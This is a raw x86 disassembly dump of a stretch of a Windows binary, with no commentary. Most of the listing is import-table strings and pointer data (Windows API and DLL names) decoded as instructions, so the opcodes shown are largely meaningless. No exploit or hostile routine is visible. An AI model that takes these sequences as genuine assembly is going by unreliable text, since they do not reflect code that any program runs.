  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	ss inc ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
